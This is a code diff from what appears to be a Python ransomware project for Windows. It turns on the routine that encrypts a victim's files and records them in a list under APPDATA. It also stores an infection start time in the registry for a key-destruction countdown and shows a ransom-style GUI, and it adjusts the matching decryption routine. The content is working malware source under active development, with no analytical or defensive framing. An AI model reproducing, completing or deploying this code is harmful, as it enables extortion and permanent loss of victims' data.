@@ -37,7 +37,7 @@ class Main(Base.Base):
 
   def __init__(self, action, decrypt_key):
     # Init Object
-    self.encrypted_file_list = os.path.join(os.environ['APPDATA'], "files.html")
+    self.encrypted_file_list = os.path.join(os.environ['APPDATA'], "encrypted_files.txt")
 
     # Init Crypt Lib
     if decrypt_key and action == "decrypt":
@@ -51,9 +51,8 @@ class Main(Base.Base):
     # handle action
     if action == "encrypt" and not os.path.isfile(self.encrypted_file_list):
       # Start encryption
-      #self.encrypt_files(file_list)
+      self.encrypt_files(file_list)
       # Present GUI
-      self.get_start_time()
       self.start_gui()
     # IF already encrypted
     elif action == "encrypt" and os.path.isfile(self.encrypted_file_list):
@@ -70,8 +69,6 @@ class Main(Base.Base):
     try:
       reg = _winreg.OpenKeyEx(self.REGISTRY_CONTEXT, self.REGISTRY_LOCATION)
       start_time = _winreg.QueryValueEx(reg, "")[0]
-      #name, value, type = _winreg.EnumValue(reg, 1)
-      #raise Exception("Name %s, Value %s, Type %s" % (name, value ,type))
     # If failure, create the key
     except WindowsError:
       start_time = int(time.time())
@@ -89,29 +86,34 @@ class Main(Base.Base):
     start_time = self.get_start_time()
     
     app = wx.App()
-    crypter_gui = Gui.MyFrame1(None, "..\\..\\build_script\\images", self.KEY_DESTRUCT_TIME_SECONDS, start_time)
-    #crypter_gui = Gui.MyFrame1(None, sys._MEIPASS, self.KEY_DESTRUCT_TIME_SECONDS)
+    #sys._MEIPASS = "..\\..\\build_script\\images"
+    crypter_gui = Gui.MyFrame1(None, 
+                               sys._MEIPASS, 
+                               self.KEY_DESTRUCT_TIME_SECONDS, 
+                               start_time,
+                               self.encrypted_file_list,
+                               self)
+                               
     crypter_gui.Show()
     app.MainLoop()
       
 
   def decrypt_files(self):
     # Function to decrypt the provided files
+    # TODO Once decrypted, delete the registry key entry
 
     # Get list of encrypted files
     try:
       with open(self.encrypted_file_list) as fh:
-        file_list = fh.read()
+        file_list = fh.readlines()
       fh.close()
     except IOError:
       raise Exception("A list of encrypted files was not found at: %s" % self.encrypted_file_list)
 
     # Decrypt!
-    for encrypted_file in file_list.split("<br>"):
+    for encrypted_file in file_list:
       if not encrypted_file:
         continue
-
-      print("Decrypting {}".format(encrypted_file.rstrip()))
 
       # IF successful decryption, delete locked file
       locked_path = self.Crypt.decrypt_file(encrypted_file.rstrip())
@@ -149,9 +151,9 @@ class Main(Base.Base):
       fh = open(self.encrypted_file_list, "w")
       for encrypted_file in encrypted_files:
         fh.write(encrypted_file)
-        fh.write("<br>")
+        fh.write("\n")
       fh.close()
-
+      
 
   def find_files(self):
     # Function to find the relevant files to encrypt and return a list
